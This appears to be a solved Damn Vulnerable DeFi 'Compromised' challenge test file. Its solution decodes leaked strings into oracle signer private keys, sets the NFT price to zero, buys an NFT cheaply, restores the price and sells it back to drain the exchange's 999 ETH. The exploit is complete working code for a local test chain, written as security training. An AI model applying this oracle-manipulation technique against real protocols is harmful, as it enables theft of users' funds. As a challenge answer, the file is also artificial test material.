const { expect } = require('chai');
const { ethers } = require('hardhat');
const { setBalance } = require('@nomicfoundation/hardhat-network-helpers');

describe('Compromised challenge', function () {
    let deployer, player;
    let oracle, exchange, nftToken;

    const sources = [
        '0xA73209FB1a42495120166736362A1DfA9F95A105',
        '0xe92401A4d3af5E446d93D11EEc806b1462b39D15',
        '0x81A5D6E50C214044bE44cA0CB057fe119097850c'
    ];

    const EXCHANGE_INITIAL_ETH_BALANCE = 999n * 10n ** 18n;
    const INITIAL_NFT_PRICE = 999n * 10n ** 18n;
    const PLAYER_INITIAL_ETH_BALANCE = 1n * 10n ** 17n;
    const TRUSTED_SOURCE_INITIAL_ETH_BALANCE = 2n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, player] = await ethers.getSigners();
        
        // Initialize balance of the trusted source addresses
        for (let i = 0; i < sources.length; i++) {
            setBalance(sources[i], TRUSTED_SOURCE_INITIAL_ETH_BALANCE);
            expect(await ethers.provider.getBalance(sources[i])).to.equal(TRUSTED_SOURCE_INITIAL_ETH_BALANCE);
        }
        
        // Player starts with limited balance
        setBalance(player.address, PLAYER_INITIAL_ETH_BALANCE);
        expect(await ethers.provider.getBalance(player.address)).to.equal(PLAYER_INITIAL_ETH_BALANCE);
        
        // Deploy the oracle and setup the trusted sources with initial prices
        const TrustfulOracleInitializerFactory = await ethers.getContractFactory('TrustfulOracleInitializer', deployer);
        oracle = await (await ethers.getContractFactory('TrustfulOracle', deployer)).attach(
            await (await TrustfulOracleInitializerFactory.deploy(
                sources,
                ['DVNFT', 'DVNFT', 'DVNFT'],
                [INITIAL_NFT_PRICE, INITIAL_NFT_PRICE, INITIAL_NFT_PRICE]
            )).oracle()
        );

        // Deploy the exchange and get an instance to the associated ERC721 token
        exchange = await (await ethers.getContractFactory('Exchange', deployer)).deploy(
            oracle.address,
            { value: EXCHANGE_INITIAL_ETH_BALANCE }
        );
        nftToken = await (await ethers.getContractFactory('DamnValuableNFT', deployer)).attach(await exchange.token());
        expect(await nftToken.owner()).to.eq(ethers.constants.AddressZero); // ownership renounced
        expect(await nftToken.rolesOf(exchange.address)).to.eq(await nftToken.MINTER_ROLE());
    });

    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */

        // 4d48686a4e6a63345a575978595745304e545a6b59545931597a5a6d597a55344e6a466b4e4451344f544a6a5a475a68597a426a4e6d4d34597a49314e6a42695a6a426a4f575a69593252685a544a6d4e44637a4e574535
        // 4d4867794d4467794e444a6a4e4442685932526d59546c6c5a4467344f5755324f44566a4d6a4d314e44646859324a6c5a446c695a575a6a4e6a417a4e7a466c4f5467334e575a69593251334d7a597a4e444269596a5134
        // From the response snippet we can convert these in utf-8 obtaining respectively
        // MHhjNjc4ZWYxYWE0NTZkYTY1YzZmYzU4NjFkNDQ4OTJjZGZhYzBjNmM4YzI1NjBiZjBjOWZiY2RhZTJmNDczNWE5?
        // MHgyMDgyNDJjNDBhY2RmYTllZDg4OWU2ODVjMjM1NDdhY2JlZDliZWZjNjAzNzFlOTg3NWZiY2Q3MzYzNDBiYjQ4?

        // If we base64 decode them we obtain something that has a meaning:
        const priv_key1 = '0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9'
        const priv_key2 = '0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48'

        // These seem to be private keys, hopefully of the oracle trusted sources so that we can sign the transactions
        // and manipulate the prices. We could buy them for (almost) free and then reset the price as before and drain the exchange (999 ETH)

        // sources[1] = 0xe92401A4d3af5E446d93D11EEc806b1462b39D15
        const signer1 = new ethers.Wallet(priv_key1, ethers.provider)
        // sources[2] = 0x81A5D6E50C214044bE44cA0CB057fe119097850c
        const signer2 = new ethers.Wallet(priv_key2, ethers.provider)

        // Let's try to set the price = 0 from these two oracle's trusted souces.
        await (await oracle.connect(signer1)).postPrice("DVNFT", 0)
        await (await oracle.connect(signer2)).postPrice("DVNFT", 0)
        // price should be 0
        expect(await (await oracle.connect(player)).getMedianPrice("DVNFT")).to.eq(0)

        // Let's buy 1 for 0 ETH (the exchange will send me back the 0.1 ETH, he just wants non zero msg.value even if price = 0)
        await (await exchange.connect(player)).buyOne({value: 1n * 10n ** 16n})
        const nftid = 0;
        await exchange.on("TokenBought", (buyer, id, price) => {
            nftid = id
            console.log(buyer, nftid, price);
        });
        expect(await nftToken.balanceOf(player.address)).to.eq(1)

        // now that I have an NFT, let's put the original prices back to 999 ETH so the exchange will pay me the absurd price
        await (await oracle.connect(signer1)).postPrice("DVNFT", INITIAL_NFT_PRICE)
        await (await oracle.connect(signer2)).postPrice("DVNFT", INITIAL_NFT_PRICE)
        expect(await (await oracle.connect(player)).getMedianPrice("DVNFT")).to.eq(INITIAL_NFT_PRICE)

        await nftToken.connect(player).approve(exchange.address, nftid)
        await exchange.connect(player).sellOne(nftid)
    });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
        
        // Exchange must have lost all ETH
        expect(
            await ethers.provider.getBalance(exchange.address)
        ).to.be.eq(0);
        
        // Player's ETH balance must have significantly increased
        expect(
            await ethers.provider.getBalance(player.address)
        ).to.be.gt(EXCHANGE_INITIAL_ETH_BALANCE);
        
        // Player must not own any NFT
        expect(
            await nftToken.balanceOf(player.address)
        ).to.be.eq(0);

        // NFT price shouldn't have changed
        expect(
            await oracle.getMedianPrice('DVNFT')
        ).to.eq(INITIAL_NFT_PRICE);
    });
});
